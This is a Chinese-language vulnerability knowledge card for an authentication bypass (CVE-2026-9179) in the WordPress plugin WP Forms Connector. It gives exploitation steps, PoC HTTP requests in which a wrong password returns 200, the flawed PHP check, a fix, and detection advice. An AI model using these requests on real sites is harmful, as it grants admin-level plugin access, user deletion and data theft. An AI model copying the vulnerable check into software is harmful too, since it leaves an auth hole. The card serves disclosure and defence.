---
id: web-generic-auth-wordpress-rest-header-password-check-missing
title: WordPress 插件 REST 回调只查用户名与角色不验密码：任意密码冒充管理员（CVE-2026-9179）
type: scenario
domain: web
path: web/generic/auth
technique: wordpress-rest-header-missing-password-check
tags:
- wordpress
- auth-bypass
- rest-api
- cve-2026-9179
- php
- missing-password-check
- header-auth
cve:
- CVE-2026-9179
severity: high
confidence: high
affected_versions: WP Forms Connector 1.8（原文环境；PoC 标注 <= 1.8，暂无官方补丁）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V28
  verified_at: '2026-11-05T03:14:49+08:00'
  notes: 已对照原文与截图核对：permission_callback __return_true，listPost 仅 get_user_by+角色判断、无 wp_check_password；图05无头返回400，图06 Username=admin+错误Password仍200，认证绕过成立。原文称7端点同缺陷；仅post/list实测200，其余端点功能未逐一验证。版本1.8/<=1.8、暂无官方补丁按原文。
url: /docs/web/generic/auth/web-generic-auth-wordpress-rest-header-password-check-missing/
draft: false
kb_aliases:
- WP Forms Connector 认证绕过
- CVE-2026-9179 认证绕过
- get_user_by 不验密码
- Username Password header 认证
- permission_callback __return_true
- WordPress REST 认证缺失
---

## 一句话结论

WP Forms Connector 的 REST 回调把 `Username`/`Password` 请求头当作认证凭据，但只调用 `get_user_by('login', $username)` 查用户并检查角色是否为 `administrator`，从未调用 `wp_check_password()` 验证密码；攻击者只要知道管理员用户名，带上任意非空 `Password` 头即可通过认证，调用该插件所有受保护的 REST 端点。

## 原理

- **第一层：REST 权限回调放行**。插件用 `register_rest_route('wp/v3', ...)` 注册端点，并把 `permission_callback` 设为 `'__return_true'`。WordPress REST Server 在分发前调用该回调，返回 true 即进入业务回调，因此端点本身对匿名用户完全开放。
- **第二层：回调内的“伪认证”**。`listPost()` 从 `$_SERVER` 解析 `Username`、`Password` 头，然后：
  - `$user = get_user_by('login', $username)`：仅按登录名查询 `wp_users`，返回 `WP_User` 对象，**不校验任何凭据**；
  - `$userRole = implode(', ', $user_info->roles)`：取角色字符串；
  - `if (!empty($username && $password))`：只判断两个变量非空；
  - `if ($userRole == 'administrator')`：只判断角色。
  - 整个流程没有 `wp_check_password($password, $user->data->user_pass, $user->ID)`，所以密码值完全不参与认证。
- **第三层：复制粘贴遗漏**。同一插件的 `Form_list()` 函数正确调用了 `wp_check_password`，说明开发者知道正确写法；`listPost()` 显然是在复制认证代码时漏掉了这一行，形成“有认证的样子、无认证的实质”。
- **影响范围**：同一插件有 7 个 `permission_callback '__return_true'` 的端点都存在相同缺陷，其中 4 个还叠加 ORDER BY SQL 注入（见关联卡片），使认证绕过成为数据窃取的入口。

## 触发条件

- 目标安装并启用 WP Forms Connector 1.8（或 PoC 标注的 <= 1.8）版本。
- REST 路由可访问（`/wp-json/wp/v3/...`），未被反向代理/WAF 拦截。
- 攻击者知道一个管理员用户名（WordPress 默认常为 `admin`，也可通过作者页、REST 用户列表等枚举）。
- 请求携带 `Username: <admin>` 与任意非空 `Password: <任意值>` 头。

## 利用步骤

1. 探测端点：请求 `/wp-json/wp/v3/post/list?order=DESC&limit=1`，不带认证头，确认返回 400/401 而不是 404，说明路由存在。
2. 枚举或猜测管理员用户名（默认 `admin`，或从 `/wp-json/wp/v2/users`、文章作者页获取）。
3. 带上 `Username: admin` 和错误的 `Password: anything` 请求同一端点。
4. 若返回 200（而非 401/400），确认密码校验缺失，认证绕过成立。
5. 用该组合访问其余端点（`page/list`、`user/list`、`comment/list`、`post/create`、`page/create`、`user/delete/<id>`），按端点功能读取/创建/删除数据。
6. 结合 `order` 参数的 ORDER BY 注入进一步提取数据库内容。

## PoC

无认证头（被拒绝）：

```http
GET /wp-json/wp/v3/post/list?order=DESC&limit=1 HTTP/1.1
Host: target:9982
```

响应：

```json
{"code":"Error","message":"You must Enter specify a valid username and password.","data":{"status":400}}
```

错误密码（绕过成功）：

```http
GET /wp-json/wp/v3/post/list?order=DESC&limit=1 HTTP/1.1
Host: target:9982
Username: admin
Password: dsadbaskjdljasn
```

响应：

```json
HTTP/1.1 200 OK
{"timezone":"Asia/Shanghai","data":[]}
```

对应的脆弱认证代码：

```php
$username = $headers['Username'];
$password = $headers['Password'];          // 任意非空值
$user = get_user_by('login', $username);    // 只查用户，不验密码
$user_info = get_userdata($user->ID);
$userRole = implode(', ', $user_info->roles);

if (!empty($username && $password)) {       // 仅判空
    if ($userRole == 'administrator') {     // 仅角色
        // 没有 wp_check_password()，继续执行业务逻辑
    }
}
```

正确写法（同插件 `Form_list()` 的做法）：

```php
$result = $user && wp_check_password($password, $user->data->user_pass, $user->ID);
if (!$result) {
    return new WP_Error('invalid_credentials', 'Invalid username or password.', array('status' => 401));
}
```

## 变体与关联

- 变体：其他 WordPress 插件把 `permission_callback` 设为 `__return_true`，再在回调里用 `get_user_by`/`get_userdata` + 角色判断当认证，同样会漏掉密码校验。
- 变体：若回调只检查 `is_user_logged_in()` 或仅检查角色字符串，也可能被未认证请求或低权限用户绕过。
- 变体：`Username` 头可用管理员登录名；若目标改了默认 admin 用户名，可先枚举作者/REST 用户接口。
- 关联卡片：[[web-generic-sqli-wordpress-plugin-order-by-time-blind]]（同一 CVE 的 ORDER BY 注入，认证绕过是其前置）、[[web-generic-auth-missing-function-level-role-check]]（只验角色/登录不验操作权限的另一类缺陷）。
- 边界：插件未启用、端点被 WAF 拦截、管理员用户名未知且无法枚举时利用受限；该绕过只赋予插件端点内的管理员逻辑权限，不等于直接获得 WordPress 后台会话。

## 检测与防御

- 检测：审计插件中 `permission_callback.*__return_true` 的端点，并检查回调内是否调用 `wp_check_password`；对 `Username`/`Password` 自定义头做认证的接口保持警惕；监控同一 IP 用不同密码反复请求 REST 端点。
- 修复：REST 端点使用 `current_user_can()`/nonce 或标准 WordPress 认证；如必须自定义头认证，务必用 `wp_check_password()` 验证密码，失败返回 401；不要把角色字符串比较当作认证。
- 加固：无官方补丁时卸载/禁用该插件；WAF 临时阻断 `/wp-json/wp/v3/` 下的可疑请求；限制管理员用户名暴露，启用强密码与 2FA。
